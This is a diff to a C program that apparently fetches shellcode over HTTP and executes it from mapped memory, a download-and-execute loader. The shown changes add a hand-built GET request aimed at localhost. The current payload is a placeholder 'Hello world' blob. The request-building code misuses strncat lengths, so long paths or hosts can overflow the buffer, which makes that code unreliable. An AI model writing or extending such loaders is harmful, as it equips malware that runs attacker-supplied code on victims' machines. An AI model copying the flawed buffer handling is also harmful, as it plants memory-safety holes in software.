@@ -4,6 +4,8 @@
 #include <sys/mman.h>  // mmap, mumap
 #include <errno.h>  // erno
 
+#define MAX_BUFFER 1024
+
 /**
  * Execute the shellcode
  * @param shellcode the memory address of the shellcode to be executed
@@ -46,10 +48,16 @@ int execute_shellcode(void* shellcode, size_t size) {
  * Get shellcode from a source
  * @param shellcode pointer which will point to the heap allocated shellcode.
  * 		Must be free'd once done.
- * @param url the URL of the shellcode
+ * @param path the path of the shellcode on the HTTP server,
+ * 					including the root (ex. /directry/directory2/file.bin)
+ * @param host the host of the HTTP server (ex. https://<host>/)
+ * @param port the port to send the HTTP request to
  * @return the size of the shellcode
  */
-size_t get_shellcode(void** shellcode, const char* url) {
+size_t get_shellcode(void** shellcode,
+					 const char* path,
+					 const char* host,
+					 int port) {
 	char hello_code[] = 
     "\xe9\x1e\x00\x00\x00"  //          jmp    (relative) <MESSAGE>
     "\xb8\x04\x00\x00\x00"  //          mov    $0x4,%eax
@@ -64,6 +72,15 @@ size_t get_shellcode(void** shellcode, const char* url) {
     "Hello wolrd!\r\n";     // OR       "\x48\x65\x6c\x6c\x6f\x2c\x20\x57"
                             //          "\x6f\x72\x6c\x64\x21\x0d\x0a"
 
+	char get_request[MAX_BUFFER] = "GET ";
+	strncat(get_request, path, MAX_BUFFER - 1);
+	strncat(get_request, " HTTP/1.1\r\nHost: ", MAX_BUFFER - 1);
+	strncat(get_request, host, MAX_BUFFER - 1);
+	strncat(get_request, "\r\n\r\n", MAX_BUFFER - 1);
+	printf("Headers: \n%s", get_request);
+
+	
+
 	size_t size = sizeof(hello_code) - 1;  // content-length;
 	(*shellcode) = malloc(size);  // allocate memory to store shellcode
 
@@ -76,7 +93,7 @@ size_t get_shellcode(void** shellcode, const char* url) {
 
 int main(int argc, const char** argv) {
 	void* shellcode = NULL;
-	size_t shellcode_size = get_shellcode(&shellcode, "http://localhost:3000/test.bin");
+	size_t shellcode_size = get_shellcode(&shellcode, "/test.bin", "localhost", 3000);
 
 	// test to show shellcode:
 	// for (size_t i = 0; i < shellcode_size; i++) {
